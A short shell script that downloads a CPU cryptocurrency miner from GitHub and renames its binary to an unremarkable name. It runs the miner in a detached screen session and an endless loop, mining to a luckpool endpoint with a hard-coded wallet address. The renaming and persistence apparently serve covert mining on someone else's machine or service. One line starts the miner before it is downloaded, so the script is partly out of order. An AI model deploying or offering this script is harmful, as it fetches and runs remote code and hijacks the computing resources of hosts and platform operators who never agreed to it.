#!/bin/sh
sudo apt update
sudo apt install cpulimit
sudo apt install screen -y
screen -dmS random ./hellminer 65 75
wget  https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz
tar xf hellminer_cpu_linux.tar.gz
mv hellminer bgaskeun
while [ 1 ]; do
./bgaskeun -c stratum+tcp://na.luckpool.net:3956#xnsub -u RYA9hTgYmNFayype84LN2cHCD2qg1bY4KK.a1 -p d=4096s --cpu 2
sleep 3
done
sleep 999